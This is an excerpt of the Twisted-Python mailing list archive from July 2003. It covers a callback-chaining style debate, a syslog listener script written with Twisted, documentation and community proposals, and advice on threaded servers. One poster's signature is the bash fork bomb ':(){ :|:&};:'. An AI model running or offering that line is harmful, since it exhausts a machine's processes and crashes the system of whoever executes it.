In-Reply-To: <20030710141732.GB15922@lapdog>
References: <20030710141732.GB15922@lapdog>, <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com>
Message-ID: <20030710153326.18861.qmail@green.zadka.com>

On Thu, 10 Jul 2003, Tommi Virtanen <tv at twistedmatrix.com> wrote:

> On Thu, Jul 10, 2003 at 12:41:25PM -0000, Moshe Zadka wrote:
> > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > ).addCallback(util.println
> > ).addCallback(lambda _: reactor.stop())
> 
> 	*vomit*
> 
> d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
> d.addCallback(util.println)
> d.addCallback(lambda _: reactor.stop())
> 
> 	anyone?

No.
The above is the common, and correct, coding style.
It is the very reason .addCallback returns self. 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From rdrb at 123.cl  Thu Jul 10 10:44:00 2003
From: rdrb at 123.cl (=?iso-8859-1?Q?Rita_D=EDaz_y/o_Rodrigo_Benenson?=)
Date: Thu, 10 Jul 2003 12:44:00 -0400
Subject: [Twisted-Python] Is it just me ....
References: <20030710072001.1990.59472.Mailman@pyramid.twistedmatrix.com>
Message-ID: <001801c34702$79ce5d60$4b30fea9@laboratorio>

Hi,
shortly,
I would like to say that I found the Twisted Documentation Excellent because
it is extensive, detailled, with toy code examples and step by step. It is a
lot of reading but after it you got the picture and the feelling about how
to use Twisted.
This was my impresion, and it was usefull for me; I'm develloping a
collaborative outlined text editor, and Twisted support has bee fundamental.
So I would point that the documentation style is a Plus for Twisted.

There are clear problems on the documentation updating delays, specially
Woven has some sections unfilled from various month (Guard, LivePage). Also
the list posted a change on cred but I still not viewing differences on the
web docs. Having a good doc is fine, but unusefull if it is not up to date.

So I propose to first update the docs before creating toy apps. I think,
like some of you, that the examples will come with the time as Twisted
become more and more popular (ActiveStateAwards, various webpublications,
usages in more and more comunities).

Proposal of an interesant example (I did not look it in detail but is a
potential use-everything example) http://www.fettig.net/projects/hep/

Now, on another hand, I'm a little worried about the workflow of Twisted. As
they don't use SourceForge, and I don't see any project manager software I
suppose that devellopment is driven by less than 10 people coordinating
between them via this list and by IRC. This can work fine for you
(devellopers) but does not help to have an active comunity (if you are
consultant, deploying a user comunity is one of your interests, right?).

So I propose, better than using Plone (yerk...), to define the requirements
about what could be usefull to be show to the comunity and devellop or reuse
the required code (integrating where necesarry into the TwistedWeb, not
replacing the twisted web).
The obvious first are:
- An online todo list
- A feature request space
- A bug tracker

This is extra simple to do (issues + a wiki) and could help a lot.

I hope this could help to do a better Twisted.

Twisted is great an give network software tools at a previously unknown
ratio of power vs simplicity.

RodrigoB.










From 2002 at weholt.org  Thu Jul 10 10:59:26 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 18:59:26 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com>
Message-ID: <002b01c34704$9ef42eb0$0401a8c0@razor>

Talk about a success story!

To make a long story short; at work we needed a syslog-deamon to use with
our firewall because we got some problems with attacks and virii sending
mass-emails using our SMTP-server. To better get a grip on the log generated
by the firewall we wanted to send it to a syslog-deamon and parse the data,
possible stuff it into a database. I created a UDP/HTTP server listening on
514 for syslog data and serving current status, reports and management pages
using http/html on 8080. A small project, but it did lift some eyebrows on
some of my co-workers and they started talking about additions and new
functionality they wanted.

Now we got a webpage showing the latest activity, archives for older logs
etc.

All done in less than 30 minutes thanks to Twisted!! :-)

Best regards,
Thomas


----- Original Message -----
From: "Moshe Zadka" <m at moshez.org>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 11:48 AM
Subject: Re: [Twisted-Python] Implementing a syslog-deamon ??


> On Thu, 10 Jul 2003, "Thomas Weholt \( PRIVAT \)" <2002 at weholt.org> wrote:
>
> > I was wondering if I could implement a fully syslog-compatible
> > syslog-deamon/server using Twisted?
>
> Yes it is. Writing a syslog is not extremely hard.
> [Note that it will probably constrain your mounting order, since syslog
> has to start pretty soon. OTOH, putting /usr/ on a different partition
> than / is an obsolete idea, so that shouldn't be a big problem.]
>
> > We need a syslog up and running as soon
> > as possible to let our firewall use it, due to some suspicion about
hacking
> > etc.
>
> "As soon as possible" and "implement my own" are usually at odds.
>
> > It would help alot of I could implement a syslog-deamon that put data
> > sent to it into a database, instead of to a file. The server must be
able to
> > run on Windows.
>
> Why? What in syslog logs to a a syslog daemon? More importantly, syslog
> relies on unix-specific APIs, IIRC, like named pipes or unix domain pipes.
>
> --
> Moshe Zadka -- http://moshez.org/
> Buffy: I don't like you hanging out with someone that... short.
> Riley: Yeah, a lot of young people nowadays are experimenting with
shortness.
> Agile Programming Language -- http://www.python.org/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From smurf at smurf.noris.de  Thu Jul 10 10:54:37 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Thu, 10 Jul 2003 18:54:37 +0200
Subject: [Twisted-Python] Re: IMAP fixes
References: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz> <20030710073003.GB21625@frobozz>
Message-ID: <pan.2003.07.10.16.54.35.701702@smurf.noris.de>

Hi, Andrew Bennetts wrote:

> Note that the fact Moshe's splitting was incorrect is a good sign that REs
> aren't easily readable and understandable ;)

Actually, it's a sign that translating REs into explicit code is
error-prone. This should not surprise anybody. ;-)

Personally, I'd rather use the RE version. For me it's actually easier to
read than explicit code ("bra".."cket" -- duh).

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
BOFH excuse #412:

Radial Telemetry Infiltration




From skin_pup-twisted at damnable.happypoo.com  Thu Jul 10 06:42:49 2003
From: skin_pup-twisted at damnable.happypoo.com (Skinny Puppy)
Date: Thu, 10 Jul 2003 08:42:49 -0400
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no>
Message-ID: <20030710124249.GD2672@shitbomb.com>

Attached is a basic quick easy syslog listener (best name I could come up
with).  In our environment we user deamontools for all daemons and us
multilog to handle logging this is no different. 

Jeremy

Thomas Weholt ( PRIVAT ) [2002 at weholt.org] wrote:
> Hi,
> 
> I was wondering if I could implement a fully syslog-compatible
> syslog-deamon/server using Twisted? We need a syslog up and running as soon
> as possible to let our firewall use it, due to some suspicion about hacking
> etc. It would help alot of I could implement a syslog-deamon that put data
> sent to it into a database, instead of to a file. The server must be able to
> run on Windows.
> 
> This would also be a perfect oppertunity to show of Python, open-source and
> Twisted to a group of people who adore Microsoft and Borland and think
> python and all other scripting-languages are for kids and trivial,
> non-critical things.
> 
> Anyway, any hint you can give me will be appreciated.
> 
> Best regards,
> Thomas
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
-------------- next part --------------
#!/usr/local/bin/pythonN)
from twisted.internet import defer, reactor, protocol, ssl
from twisted.python import usage
from OpenSSL import SSL
import sys, os.path

LOG_PRIMASK = 0x07
PRIMASK = { 
0 : "emerg", 
1 : "alert",
2 : "crit",
3 : "err",
4 : "warning",
5 : "notice",
6 : "info",
7 : "debug"
}

FACILITYMASK = {
      0  : "kern",
      1  : "user",
      2  : "mail",
      3  : "daemon",
      4  : "auth",
      5  : "syslog",
      6  : "lpr",
      7  : "news",
      8  : "uucp",
      9  : "cron",
      10 : "authpriv",
      11 : "ftp",
      12 : "ntp",
      13 : "security",
      14 : "console",
      15 : "mark",
      16 : "local0",
      17 : "local1",
      18 : "local2",
      19 : "local3",
      20 : "local4",
      21 : "local5",
      22 : "local6",
      23 : "local7",
}

def bit2string(number):
    try: return "%s.%s"%(FACILITYMASK[number>>3] , PRIMASK[number & LOG_PRIMASK])
    except: return "unknown.unknown"
        

class syslogOptions(usage.Options):
    optParameters = [['cert', 'c', './server.pem','SSL Server certificate'],
                     ['ip',   'i', None, 'IP Address to listen on']]
    def postOptions_cert(self):
        if (not self.opts['cert']) or (not os.path.isfile(self.opts['cert'])):
            raise usage.UsageError, "%s: is not a file"
    def portOptions_ip(self):
        if (not self.opts['ip']):
            raise usage.UsageError, "IP Address is required"
    
class outputUPD(protocol.DatagramProtocol):
    def datagramReceived(self, data, (ip, port)):
        if data[2] == ">":
            other = " ".join([ip, bit2string(int(data[1]))])
            sys.stdout.write(" ".join([other, data[3:], "\n"]))
        elif data[3] == ">":
            other = " ".join([ip, bit2string(int(data[1:2]))])
            sys.stdout.write(" ".join([other, data[4:], "\n"]))
        else:
            other = " ".join([ip, "unknown.unknown"])
            sys.stdout.write(" ".join([other, data, "\n"]))

class outputTCP(protocol.Protocol):
    def connectionMade(self):
        self.factory.numberConnections += 1
        if self.factory.numberConnections > self.factory.maxNumberConnections:
            self.transport.loseConnection()

    def connectionLost(self, reason):
        self.factory.numberConnections -= 1

    def dataReceived(self, data):
        ip = self.transport.getPeer()[1]
        if data[2] == ">":
            other = " ".join([ip, bit2string(int(data[1]))])
            self.factory.write(" ".join([other, data[3:], "\n"]))
        elif data[3] == ">":
            other = " ".join([ip, bit2string(int(data[1:2]))])
            self.factory.write(" ".join([other, data[4:], "\n"]))
        else:
            other = " ".join([ip, "unknown.unknown"])
            self.factory.write(" ".join([other, data, "\n"]))

class syslogFactory(protocol.Factory):
    noisy = 0
    numberConnections = 0
    maxNumberConnections = 256
    write = sys.stdout.write
    
    

if __name__ == "__main__":
    import sys, os
    from twisted.python import log
    log.logfile=sys.stderr
    try:
        config = syslogOptions()
        config.parseOptions()
    except usage.UsageError, ue:
        print >>sys.stderr, '%s:'%sys.argv[0], ue
        sys.exit(1)
    syslogTCP = syslogFactory()
    syslogTCP.protocol = outputTCP
    syslogSSL = syslogFactory()
    syslogSSL.protocol = outputTCP
    ctx = ssl.DefaultOpenSSLContextFactory(config.opts['cert'], config.opts['cert'])
    reactor.listenUDP(514, outputUPD(), interface=config.opts['ip'])
    reactor.listenTCP(514, syslogTCP,   interface=config.opts['ip'])
    reactor.listenSSL(728, syslogSSL , ctx, interface=config.opts['ip'])
    reactor.run()

From tv at twistedmatrix.com  Thu Jul 10 13:17:59 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 10 Jul 2003 22:17:59 +0300
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710153326.18861.qmail@green.zadka.com>
References: <006f01c34676$9a28db80$0401a8c0@razor> <20030710090455.6350.qmail@green.zadka.com> <20030710124125.11536.qmail@green.zadka.com> <20030710153326.18861.qmail@green.zadka.com>
Message-ID: <20030710191759.GA18878@lapdog>

On Thu, Jul 10, 2003 at 03:33:26PM -0000, Moshe Zadka wrote:
> > > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > > ).addCallback(util.println
> > > ).addCallback(lambda _: reactor.stop())
> > 
> > 	*vomit*
> > 
> > d = checkHosts(('moshez.org', 25), ('moshez.org', 22))
> > d.addCallback(util.println)
> > d.addCallback(lambda _: reactor.stop())
> > 
> > 	anyone?
> 
> No.
> The above is the common,

	Unfortunately.

> and correct, coding style.

	Yes, it's legal. It's still ugly.

> It is the very reason .addCallback returns self. 

	Yes, and that's part of the problem; not the reason
	why ugly code should be tolerated.


	I mean, eww yuk. Look at it. ")" at the start of every
	(non-first) line? A special case for the last line?

	 |         |
	 v         v     |
	return foo(      v
	).addCallback(bar
	).addCallback(baz
	).addCallback(quux
	).addCallback(thud
	).addCallback(xyzzy)
	^                  ^
	|                  |


	The prettier alternative isn't even noticably longer,
	and is easier to type even. And the last line isn't
	a special case. And it doesn't separate a return away
	from the end of the functions.


	That snippet looks like the reason I left perl. Stop
	giving me the creeps, and give me code that looks
	simple, regular and easy to scan.

-- 
:(){ :|:&};:



From mesozoic at polynode.com  Thu Jul 10 13:28:44 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Thu, 10 Jul 2003 15:28:44 -0400
Subject: [Twisted-Python] Implementing a syslog-deamon ??
In-Reply-To: <002b01c34704$9ef42eb0$0401a8c0@razor>
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com> <002b01c34704$9ef42eb0$0401a8c0@razor>
Message-ID: <20030710192844.GI13205@polynode.com>

Twisted suddenly isn't so painful, is it?  :)

I'm working on a similar (though more convoluted) project to collect logs
and general event information from a wide array of sources.  I started with
syslog because it was easy to implement.  Next up are Windows Event Logs,
MySQL databases, and FBI employee records. (Whoops; forget I said that last
part.)

I've written something that's probably close to what you have -- a server
that listens for syslog messages, then does stuff with them.  (Only I've
implemented it for TCP, which requires syslog-ng; I'd like to see whether
UDP is much different.)

As soon as my code is to a semi-workable state, I plan on releasing it (and
posting to the list, of course) -- this should be another week or so.
In the meantime, could we see what you've come up with?

Working examples and discussion of coding practices are a Good Thing,
especially when you can get the senior Twisted guys involved ;)

-- 
Alex Levy
WWW: http://mesozoic.geecs.org

"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From 2002 at weholt.org  Thu Jul 10 14:33:00 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 22:33:00 +0200
Subject: [Twisted-Python] Implementing a syslog-deamon ??
References: <000901c346c6$3cc02480$3ba8a8c0@gatsoft.no> <20030710094833.8146.qmail@green.zadka.com> <002b01c34704$9ef42eb0$0401a8c0@razor> <20030710192844.GI13205@polynode.com>
Message-ID: <006501c34722$750e56c0$0401a8c0@razor>

Eh ... I'm not sure. My contract with my employeer states very clear that
anything produced with hardware or software which belong to them or any
results of work done during my workhours belong to them so I really don't
know.

Anyway, it was rather easy and the code isn't cleaned up for
mass-consumption so to speak. It was something that had to be done quickly.

I'll see what I can do.

Thomas

----- Original Message -----
From: "Alex Levy" <mesozoic at polynode.com>
To: <twisted-python at twistedmatrix.com>
Sent: Thursday, July 10, 2003 9:28 PM
Subject: Re: [Twisted-Python] Implementing a syslog-deamon ??


> Twisted suddenly isn't so painful, is it?  :)
>
> I'm working on a similar (though more convoluted) project to collect logs
> and general event information from a wide array of sources.  I started
with
> syslog because it was easy to implement.  Next up are Windows Event Logs,
> MySQL databases, and FBI employee records. (Whoops; forget I said that
last
> part.)
>
> I've written something that's probably close to what you have -- a server
> that listens for syslog messages, then does stuff with them.  (Only I've
> implemented it for TCP, which requires syslog-ng; I'd like to see whether
> UDP is much different.)
>
> As soon as my code is to a semi-workable state, I plan on releasing it
(and
> posting to the list, of course) -- this should be another week or so.
> In the meantime, could we see what you've come up with?
>
> Working examples and discussion of coding practices are a Good Thing,
> especially when you can get the senior Twisted guys involved ;)
>
> --
> Alex Levy
> WWW: http://mesozoic.geecs.org
>
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From glyph at twistedmatrix.com  Thu Jul 10 15:08:02 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Thu, 10 Jul 2003 16:08:02 -0500
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030710191759.GA18878@lapdog>
Message-ID: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>

On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:

>> It is the very reason .addCallback returns self.
>
> 	Yes, and that's part of the problem; not the reason
> 	why ugly code should be tolerated.

This is a highly subjective discussion, of course.  IMHO, the 
multiple-lines-of-chained-addCallback style is easier to both to read 
and write because, provided you use a sensible editor, the indentation 
will end up something like this instead:

   return foo (
     ).addCallback(bar
     ).addCallback(baz
     ) # ...

If the proper placement of parentheses is a particular problem for you, 
consider

   return (foo()
           .addCallback(bar)
           .addCallback(baz)
           .addCallback(boz))

which is a style that I often prefer.

If you think _that_ is too ugly, then I wonder how you would wrap 
parameters across multiple lines - however, this ugliness will only 
_really_ be solved by adding some kind of block syntax to python.  
Personally I have better things to do at the moment.

As in any coding style discussion, consistency wins over correctness, 
so for Twisted, this is the "right way" to chain callbacks as far as 
I'm concerned :).




From pinard at iro.umontreal.ca  Thu Jul 10 16:00:40 2003
From: pinard at iro.umontreal.ca (=?iso-8859-1?q?Fran=E7ois_Pinard?=)
Date: 10 Jul 2003 18:00:40 -0400
Subject: [Twisted-Python] Re: My pet peeve ugly coding style
In-Reply-To: <20030710191759.GA18878@lapdog>
References: <006f01c34676$9a28db80$0401a8c0@razor>
	<20030710090455.6350.qmail@green.zadka.com>
	<20030710124125.11536.qmail@green.zadka.com>
	<20030710153326.18861.qmail@green.zadka.com>
	<20030710191759.GA18878@lapdog>
Message-ID: <oqfzlehwjb.fsf@titan.progiciels-bpi.ca>

[Tommi Virtanen]

> On Thu, Jul 10, 2003 at 03:33:26PM -0000, Moshe Zadka wrote:
> > > > checkHosts(('moshez.org', 25), ('moshez.org', 22)
> > > > ).addCallback(util.println
> > > > ).addCallback(lambda _: reactor.stop())

> 	Yes, it's legal. It's still ugly.

> 	return foo(      v
> 	).addCallback(bar
> 	).addCallback(baz
> 	).addCallback(quux
> 	).addCallback(thud
> 	).addCallback(xyzzy)

For the above, I would most probably use:

 	return (foo()
                .addCallback(bar)
 	        .addCallback(baz)
 	        .addCallback(quux)
 	        .addCallback(thud)
 	        .addCallback(xyzzy))

The Python mode (for Emacs) agrees with this indentation, given the
surrounding pair of parentheses exists, and this is why I type them.  This
mode (through those having written it: so far that I know, Tim Peters and
Barry Warsaw) is usually a good advisor about correct indentation.

About using dot at the beginning of the line instead of the end, it looks
strange when you are not used to it, but if follows the general principle of
GNU programming standards for C, which is worth for Python as well, that a
continued expression is more legible when the operator is at the start of
the continuation line instead of at the end of the continued one.  I follow
this convention quite systematically, and indeed, the code is more legible.

-- 
François Pinard   http://www.iro.umontreal.ca/~pinard



From golux at comcast.net  Thu Jul 10 18:27:10 2003
From: golux at comcast.net (Steve Waterbury)
Date: Thu, 10 Jul 2003 20:27:10 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>
References: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com>
Message-ID: <3F0E045E.1010504@comcast.net>

Glyph Lefkowitz wrote:
> On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:
>>
>>     Yes, and that's part of the problem; not the reason
>>     why ugly code should be tolerated.
> 
> This is a highly subjective discussion, of course.  ...

... true ... and my gut votes with Tommi.

>   return foo (
>     ).addCallback(bar
>     ).addCallback(baz
>     ) # ...

IMHO, that's still ugly.

> If the proper placement of parentheses is a particular problem for you, 
> consider
> 
>   return (foo()
>           .addCallback(bar)
>           .addCallback(baz)
>           .addCallback(boz))
> 
> which is a style that I often prefer.

Somewhat better, but I still like Tommi's example.

> If you think _that_ is too ugly, then I wonder how you would wrap 
> parameters across multiple lines  ...

To me, that's a separate issue.

> As in any coding style discussion, consistency wins over correctness, so 
> for Twisted, this is the "right way" to chain callbacks as far as I'm 
> concerned :) ...

Whatever.  "De gustibus non est disputandum."

Steve.




From glyph at twistedmatrix.com  Thu Jul 10 19:58:21 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Thu, 10 Jul 2003 20:58:21 -0500
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
In-Reply-To: <1057769430.2859.64.camel@biproc>
Message-ID: <2666D284-B343-11D7-B07D-000393C9700E@twistedmatrix.com>

On Wednesday, July 9, 2003, at 11:50 AM, Philippe Lafoucrière wrote:

> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.

Philippe, I applaud this effort, but I think that you're working on 
something different than what you think you're working on ;-).

twistedmatrix.com is the central distribution site for the software and 
documentation.  That's not to say the site doesn't need help - far from 
it, it definitely needs a new maintainer! - but something authored with 
CMF or Plone is more of a "community" website; this is like the 
distinction between http://starship.python.net/ and 
http://www.python.org/.

I think it might be good to have a separate "User Community" and 
"Developer Community".  If you launch such a site, I will gladly link 
to it from the front page of twistedmatrix.com.

These mailing lists are appropriate for much of the discussion that has 
happened on them so far, but I do occasionally feel as if the core 
Twisted development team is stifling experimentation outside the bounds 
of our original intentions for the software.

There has been much talk of the "right way" to do things of late.  
While I have strong feelings about what the "right way" is, and a lot 
more design vision than implemented code, having the user community 
veer off on some tangents to see what's possible and what "fits" 
outside the auspices of the central development community might let us 
exchange more fully-formed and coherent ideas.  Right now I feel like 
the discourse is too much like

	Application Author: "Maybe-"
	Developer: "No."
	Author: "But-"
	Developer: "Sorry."
	Author: "Oh."
	Developer: "See?"
	Author: "What's woven.guard?"
	Developer: "ARRRGH" *bang*

If the application authors themselves had a community to discuss ideas 
and present them fully-formed, we might see something more like:

	Author[s]: "Can we include advanced Frobnitz support in Twisted 1.5?"
	Developer: "It's too complicated."
	Author: "But I have a working implementation and it's only 500 lines 
of Python."
	Developer: "Oh, maybe that's not so bad.  Would you contribute it?"
	Author: "Sure.  But, what about woven.guard support?"
	Developer: "ARRRRGH" *bang*

And eventually, we can omit the last exchange as some of us have more 
free time to actually document various APIs more clearly.



From exarkun at twistedmatrix.com  Thu Jul 10 23:27:49 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 01:27:49 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <3F0E045E.1010504@comcast.net>
References: <97898954-B31A-11D7-B07D-000393C9700E@twistedmatrix.com> <3F0E045E.1010504@comcast.net>
Message-ID: <20030711052739.GA16474@intarweb.us>

On Thu, Jul 10, 2003 at 08:27:10PM -0400, Steve Waterbury wrote:
> Glyph Lefkowitz wrote:
> >On Thursday, July 10, 2003, at 02:17 PM, Tommi Virtanen wrote:
> [snip]
> 
> >  return foo (
> >    ).addCallback(bar
> >    ).addCallback(baz
> >    ) # ...
> 
> IMHO, that's still ugly.
> 
> >If the proper placement of parentheses is a particular problem for you, 
> >consider
> >
> >  return (foo()
> >          .addCallback(bar)
> >          .addCallback(baz)
> >          .addCallback(boz))
> >
> [snip]

    reduce(Deferred.addCallback, (bar, baz, boz), foo())

> Whatever.  "De gustibus non est disputandum."
> 
> Steve.
> 

  Jp
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030711/3503a07b/attachment.sig>

From glyph at twistedmatrix.com  Fri Jul 11 00:12:07 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 11 Jul 2003 01:12:07 -0500
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <20030711052739.GA16474@intarweb.us>
Message-ID: <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>

On Friday, July 11, 2003, at 12:27 AM, Jp Calderone wrote:

>     reduce(Deferred.addCallback, (bar, baz, boz), foo())

In the future, people will call this kind of mental illness "Calderone 
syndrome" and it will be well understood.  In the meanwhile, it is 
important that those of you listening in at home do NOT pay attention 
to JP when he chimes in with little nuggets like this; without the 
context of a URL with "evil" in it, I fear that someone may take him 
seriously.




From ta-meyer at ihug.co.nz  Fri Jul 11 00:14:07 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Fri, 11 Jul 2003 18:14:07 +1200
Subject: [Twisted-Python] IMAP BODYSTRUCTURE format & the email.Messages
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13025656A5@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAFE@its-xchg4.massey.ac.nz>

[Apologies for the cross-post].

Does anyone know of existing code to convert/format/flatten an email.Message
into the correct format for IMAP's BODYSTRUCTURE request?  (it basically
breaks down all the MIME parts of the message).  It can use twisted or
imaplib, or neither, I don't care.

Thanks,
Tony Meyer




From minh.luu at toll.com.au  Fri Jul 11 00:55:23 2003
From: minh.luu at toll.com.au (Minh Luu)
Date: Fri, 11 Jul 2003 16:55:23 +1000
Subject: [Twisted-Python] Simultaneously client-server app
Message-ID: <005401c34779$667b5700$0202d90a@its09455>

Twisted Masters,

Has anyone any suggestion on how I might start on the following task using Twisted?

What I would like to do is a type of server that will serve a number of clients and itself is a client of other servers. It requires a spool of worker threads to perform time-consuming tasks and database related tasks.  All the network I/O will be handled by a single async thread using select. A simple diagram below demo the model I would like to implement.

Thank you.

                 |  |  |  |       ^  ^  ^  ^
                 |  |  |  |       |  |  |  |
                 V  V  V  V       |  |  |  |
            +-------------------------------------------------+
            |    Network I/O Thread                           |
            |    (async-connection using select)              |
            +-------------------------------------------------+
                             |                            ^
                             |                            |  
                             V                            |
            +----------------------------------------+    |
            |   Queue Thread                         |    |
            |   (to dispatch to the worker threads)  |    |
            +----------------------------------------+    |
               |                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
               |   +---------------------------------+    |
               |                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
               |   +---------------------------------+    |
               |                                          |
               .                                          |
               .                                          |
               |   +---------------------------------+    |
               +-->|  Worker Thread                  |----+
                   +---------------------------------+
-------------- next part --------------
An HTML attachment was scrubbed...
URL: </pipermail/twisted-python/attachments/20030711/16db3b97/attachment.html>

From andrew-twisted at puzzling.org  Fri Jul 11 01:52:38 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 11 Jul 2003 17:52:38 +1000
Subject: [Twisted-Python] Simultaneously client-server app
In-Reply-To: <005401c34779$667b5700$0202d90a@its09455>
References: <005401c34779$667b5700$0202d90a@its09455>
Message-ID: <20030711075238.GB23649@frobozz>

On Fri, Jul 11, 2003 at 04:55:23PM +1000, Minh Luu wrote:
>    Twisted Masters,
>     
>    Has anyone any suggestion on how I might start on the following task using
>    Twisted?
>     
>    What I would like to do is a type of server that will serve a number of
>    clients and itself is a client of other servers. It requires a spool of
>    worker threads to perform time-consuming tasks and database related
>    tasks.  All the network I/O will be handled by a single async thread using
>    select. A simple diagram below demo the model I would like to implement.
[snip pretty diagram]

I doubt threads and select are actually requirements you have, rather, it's
just how you think it should work.  But if you know how it should work, why
ask us?  ;)

There are lots of blanks in your description, so it's hard to guess what you
need to know.  You effectively have asked a couple of very general
questions, so I'll give some general answers, and hope that's enough.  If it
isn't, try being more specific about what you're doing, and I'll try to give
more specific answers.


* Question: *
"What I would like to do is a type of server that will serve a number of
clients and itself is a client of other servers."

* Answer: *
Network clients and servers in Twisted are pretty easy, and its very good
at them -- have you seen these HOWTOs?
    http://twistedmatrix.com/documents/howto/servers
    http://twistedmatrix.com/documents/howto/clients

Being a server and a client at once is as easy as:
    reactor.listenTCP(1234, MyServerFactory())
    reactor.connectTCP('host', 4321, MyClientFactory())


* Question: *
"...a spool of worker threads to perform time-consuming tasks..."

* Answer: *
Have you seen the "Using Threads" HOWTO?
    http://twistedmatrix.com/documents/howto/threading

The key tool you probably want to use when working with threads is
twisted.internet.threads.deferToThread.

Also, be aware that threads aren't necessarily the only solution to
"time-consuming tasks", although it would help to know what these tasks
actually are :)


* Question: *
"...and database related tasks"

* Answer: *
The twisted.enterprise package has support for using standard Python DB-API
2.0 compliant modules.  You probably just want to use
twisted.enterprise.adbapi, which is described here:
    http://twistedmatrix.com/documents/howto/enterprise

That document is a little out of date, unfortunately -- it doesn't mention
that you can avoid adbapi.Augmentation if you don't like that approach, and
just use adbapi.ConnectionPool directly, although the its API is fairly ugly
and not very Twisted-like.  That module could probably do with an overhaul,
but that's not your problem ;)


I hope I've helped at least a little.

Regards,

-Andrew.




From exarkun at twistedmatrix.com  Fri Jul 11 04:22:29 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 06:22:29 -0400
Subject: [Twisted-Python] My pet peeve ugly coding style
In-Reply-To: <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>
References: <20030711052739.GA16474@intarweb.us> <9972B4EE-B366-11D7-B07D-000393C9700E@twistedmatrix.com>
Message-ID: <20030711062112.GA17293@intarweb.us>

On Fri, Jul 11, 2003 at 01:12:07AM -0500, Glyph Lefkowitz wrote:
> 
> On Friday, July 11, 2003, at 12:27 AM, Jp Calderone wrote:
> 
> >    reduce(Deferred.addCallback, (bar, baz, boz), foo())
> 
> In the future, people will call this kind of mental illness "Calderone 
> syndrome" and it will be well understood.  In the meanwhile, it is 
> important that those of you listening in at home do NOT pay attention 
> to JP when he chimes in with little nuggets like this; without the 
> context of a URL with "evil" in it, I fear that someone may take him 
> seriously.
> 

  Woo hoo, my own syndrome.

-- 
#!/bin/bash
( LIST=(~/.sigs/*.sig)
  cat ${LIST[$(($RANDOM % ${#LIST[*]}))]}
  echo -- $'\n' `uptime | sed -e 's/.*m//'` ) > ~/.signature
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030711/d71ddb8a/attachment.sig>

From 2002 at weholt.org  Fri Jul 11 06:04:36 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
